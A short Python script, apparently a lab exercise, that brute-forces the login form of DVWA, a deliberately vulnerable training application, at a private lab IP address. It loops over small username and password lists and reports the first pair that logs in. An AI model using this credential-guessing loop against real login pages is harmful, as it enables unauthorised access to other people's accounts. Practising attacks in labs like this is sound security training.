import requests


USERNAMES = ['admin24234', 'admin', 'admin456456']
PASSWORDS = ['password23423', 'password', 'password456456']
URL = 'http://192.168.56.132/dvwa/login.php'


def brute():
    for user in USERNAMES:
        for password in PASSWORDS:
            DATA = {
                'username': user,
                'password': password,
                'Login': 'Login',
            }
            res = requests.post(url=URL, data=DATA)
            if 'Welcome' in res.text:
                print(f'logged in with user: {user}, password: {password}')
                return
            else:
                print(f'trying user: {user}, password: {password}')


brute()
